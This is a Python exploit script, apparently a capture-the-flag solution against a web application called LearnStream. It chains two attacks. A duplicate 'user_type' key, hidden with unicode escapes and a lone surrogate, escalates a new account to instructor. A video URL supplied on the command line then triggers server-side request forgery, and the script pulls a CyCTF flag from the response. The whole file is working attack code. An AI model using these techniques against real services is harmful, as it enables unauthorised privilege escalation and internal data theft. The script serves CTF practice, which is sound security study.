import requests
import string
import random
import re
import sys
def id_generator(size=6, chars=string.ascii_uppercase + string.digits):
    return ''.join(random.choice(chars) for _ in range(size))

URL = sys.argv[1]
USERNAME = id_generator()
PASSWORD = id_generator()
EMAIL = id_generator()
COURSES = id_generator()

def doREGISTER():
    json_data = {
        'username': f'{USERNAME}',
        'first_name': f'{USERNAME}',
        'last_name': f'{USERNAME}',
        'email': f'{EMAIL}',
        'password': F'{PASSWORD}',
        'user_type': 'employee',
        '\u0075\u0073\u0065\u0072\u005F\u0074\u0079\u0070\u0065\ud800': 'instructor',
    }

    response = requests.post('http://127.0.0.1/LearnStream/signup', json=json_data, verify=False)

    if "successfully" in response.text:
        result = response.json()
        message = result.get('message', 'No message found')
        print(f"[+] {message} [+]")


def doLOGIN():
    json_data = {
        'username': f'{USERNAME}',
        'password': F'{PASSWORD}'
    }

    response = requests.post('http://127.0.0.1/LearnStream/login', json=json_data, verify=False)

    if "access_token" in response.text:
        result = response.json()
        access_token = result.get('access_token', 'No message found')
        print(f"[+] {access_token} [+]")
        return access_token


def createCOURSE(TOKEN):
    
    headers = {
        'Authorization': f'Bearer {TOKEN}'
    }

    json_data = {
        'name': f'{COURSES}',
        'description': f'{COURSES}'
    }

    response = requests.post('http://127.0.0.1/LearnStream/courses', json=json_data, headers=headers, verify=False)
    
    if "course_id" in response.text:
        result = response.json()
        course_id = result.get('course_id', 'No message found')
        print(f"[+] {course_id} [+]")
        return course_id
    

def AddVideo(TOKEN, COURSE_ID):

    headers = {'Authorization': f'Bearer {TOKEN}'}

    json_data = {'video_url': f'{URL}','name': 'AAAAAA'}

    response = requests.post(f'http://127.0.0.1/LearnStream/courses/{COURSE_ID}/videos',headers=headers,json=json_data,verify=False)
    
    if "video_path" in response.text:
        result = response.json()
        video_path = result.get('video_path', 'No message found')
        print(f"[+] {video_path} [+]")
        return video_path
    

def DumpFLAG(TOKEN, VIDEO_PATH):
    headers = {'Authorization': f'Bearer {TOKEN}'}
    response = requests.get(f'http://127.0.0.1/LearnStream/{VIDEO_PATH}', headers=headers, verify=False)

    flag_pattern = re.compile(r'CyCTF\{.*?\}')
    match = flag_pattern.search(response.text)

    if match:
        flag = match.group()
        print(f"[+] Found flag: {flag} [+]")
    else:
        print("[-] Flag not found [-")


doREGISTER()
TOKEN = doLOGIN()
COURSE_ID = createCOURSE(TOKEN)
print("[+] Performing SSRF attack [+]")
VIDEO_PATH = AddVideo(TOKEN, COURSE_ID)
DumpFLAG(TOKEN, VIDEO_PATH)
